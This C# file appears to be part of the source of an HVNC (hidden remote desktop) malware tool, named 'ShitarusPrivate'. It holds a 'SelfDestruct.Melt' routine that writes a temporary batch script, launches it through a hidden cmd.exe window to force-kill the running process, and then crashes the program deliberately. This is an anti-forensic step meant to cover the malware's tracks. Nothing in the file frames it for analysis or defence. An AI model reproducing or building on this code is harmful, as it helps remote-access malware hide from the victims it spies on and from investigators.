using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace ShitarusPrivate.HVNC.Helpers
{
    internal sealed class SelfDestruct
    {
        public static void Melt()
        {
            string text = Path.GetTempFileName() + ".bat";
            int id = Process.GetCurrentProcess().Id;
            using (StreamWriter streamWriter = File.AppendText(text))
            {
                streamWriter.WriteLine("chcp 65001");
                streamWriter.WriteLine("TaskKill /F /IM " + id);
                streamWriter.WriteLine("Timeout /T 2 /Nobreak");
            }
            Logging.Log();
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/C " + text,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });
            Thread.Sleep(5000);
            Environment.FailFast(null);
        }
    }
}
